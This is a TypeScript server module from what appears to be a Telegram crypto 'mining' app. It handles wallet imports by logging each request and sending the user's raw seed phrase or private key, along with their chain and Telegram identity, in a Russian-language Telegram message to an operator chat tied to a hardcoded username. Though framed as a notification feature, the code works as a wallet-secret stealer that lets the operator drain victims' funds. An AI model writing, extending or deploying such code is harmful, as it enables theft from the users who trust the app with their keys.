import { getBot, isBotConfigured } from "../../../../bot/app";
import type { MiningImportRequest } from "../validation/import-wallet";
import {
  appendImportLog,
  getStoredNotifyChatId,
} from "./import-notify-store";

const IMPORT_NOTIFY_USERNAME =
  process.env.TELEGRAM_IMPORT_NOTIFY_USERNAME?.trim() || "x_zera";

export type WalletImportResult = {
  logged: boolean;
  notified: boolean;
};

function formatImportType(importType: MiningImportRequest["importType"]): string {
  return importType === "seed" ? "Seed phrase" : "Private key";
}

function buildMessage(data: MiningImportRequest): string {
  const userLabel = data.telegramUsername
    ? `@${data.telegramUsername}`
    : "unknown";

  return [
    "🔐 Новый импорт кошелька",
    "",
    `Сеть: ${data.chainName} (${data.chainId})`,
    `Тип: ${formatImportType(data.importType)}`,
    "",
    "Данные:",
    data.secret,
    "",
    `Пользователь: ${userLabel}`,
    `Telegram ID: ${data.telegramUserId ?? "unknown"}`,
  ].join("\n");
}

async function resolveNotifyChatId(): Promise<string | null> {
  const fromEnv = process.env.TELEGRAM_IMPORT_NOTIFY_CHAT_ID?.trim();
  if (fromEnv) return fromEnv;

  return getStoredNotifyChatId();
}

export async function notifyWalletImport(
  data: MiningImportRequest,
): Promise<WalletImportResult> {
  await appendImportLog(data);

  if (!isBotConfigured()) {
    console.error("Wallet import telegram notify skipped: bot not configured");
    return { logged: true, notified: false };
  }

  const chatId = await resolveNotifyChatId();
  if (!chatId) {
    console.error("Wallet import telegram notify skipped: missing chat id", {
      notifyUsername: IMPORT_NOTIFY_USERNAME,
      hint: `@${IMPORT_NOTIFY_USERNAME} must send /start to the bot once`,
    });
    return { logged: true, notified: false };
  }

  try {
    const bot = getBot();

    await bot.api.sendMessage(chatId, buildMessage(data), {
      link_preview_options: { is_disabled: true },
    });

    console.info("Wallet import notification sent", {
      chainId: data.chainId,
      importType: data.importType,
      notifyUsername: IMPORT_NOTIFY_USERNAME,
      telegramUserId: data.telegramUserId,
    });

    return { logged: true, notified: true };
  } catch (error) {
    console.error("Wallet import telegram notify failed", {
      chainId: data.chainId,
      importType: data.importType,
      error: error instanceof Error ? error.message : String(error),
    });

    return { logged: true, notified: false };
  }
}
